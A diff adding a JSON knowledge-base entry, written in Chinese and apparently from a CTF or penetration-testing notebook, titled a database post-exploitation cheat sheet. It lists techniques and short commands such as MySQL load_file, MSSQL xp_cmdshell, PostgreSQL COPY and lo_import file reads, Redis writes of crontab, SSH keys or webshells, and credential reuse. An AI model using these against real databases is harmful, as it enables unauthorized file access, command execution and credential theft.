@@ -1,0 +1,13 @@
+{
+  "id": "kb018",
+  "title": "数据库后利用速查",
+  "description": "各库拿数据/拿 shell/读文件",
+  "detail": "MySQL: SELECT load_file('/flag')；SHOW VARIABLES LIKE 'secure%'；写 shell 需权限+路径\nMSSQL: EXEC xp_cmdshell 'whoami'（sp_configure 重启用）\nPostgreSQL: COPY t FROM '/flag'；lo_import 大对象读文件\nRedis 未授权：写 crontab/ssh key/webshell（CONFIG GET dir 找路径）；主从复制 RCE\nMongoDB: 未授权直接查库\n所有库：先系统库里找用户表→凭据→复用",
+  "commands": [],
+  "tags": [
+    "db",
+    "post"
+  ],
+  "source": "经验",
+  "created_at": "2026-10-15T13:44:05Z"
+}
